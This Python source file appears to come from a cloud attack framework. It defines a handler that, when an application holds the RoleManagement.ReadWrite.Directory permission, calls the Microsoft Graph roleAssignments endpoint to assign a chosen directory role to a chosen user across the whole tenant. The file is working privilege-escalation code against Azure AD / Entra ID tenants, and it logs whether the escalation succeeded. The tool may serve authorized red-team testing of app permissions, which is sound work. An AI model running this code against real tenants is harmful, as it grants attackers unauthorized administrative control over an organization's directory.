from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.rolemanagemant')


class Rolemanagemant_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "RoleManagement.ReadWrite.Directory" in request.roles:
            status = False
            attack_name = "RoleManagementRWVectors"
            message = ""
            error = "RoleManagementRWVectors - failed"
            conf = request.attack_config['roleManagement']
            logger.debug("RoleManagement.ReadWrite.Directory - Allows the app to read and manage the role-based access control (RBAC) settings for your company's directory, without a signed-in user.")
        
            logger.debug("Attack vector - add a role to a user.")         
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"
                message_obj = {
                    "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
                    "roleDefinitionId": conf["roleId"],
                    "principalId": conf["user"],
                    "directoryScopeId": "/"
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 201:
                    message += " Added a role of %s to %s\n" % (conf["roleId"], conf["user"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in RoleManagement_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))       
            
        return super().handle(request,responses)
